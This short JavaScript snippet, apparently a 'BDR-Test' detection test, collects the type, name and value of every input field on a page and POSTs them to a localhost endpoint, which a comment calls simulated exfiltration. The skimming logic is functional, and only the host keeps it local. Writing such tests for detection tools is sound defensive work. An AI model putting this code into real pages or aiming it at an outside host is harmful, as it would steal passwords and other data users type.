(async () => {
  const inputs = document.querySelectorAll("input");
  const data = [];

  inputs.forEach((el) => {
    data.push({
      type: el.type,
      name: el.name || "",
      value: el.value || ""
    });
  });

  console.log("BDR-Test collected fields:", data);

  // Simulated “exfiltration” to localhost only
  try {
    await fetch("http://localhost:3000/collect", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ timestamp: Date.now(), data })
    });
  } catch (e) {
    console.warn("Local server not running");
  }
})();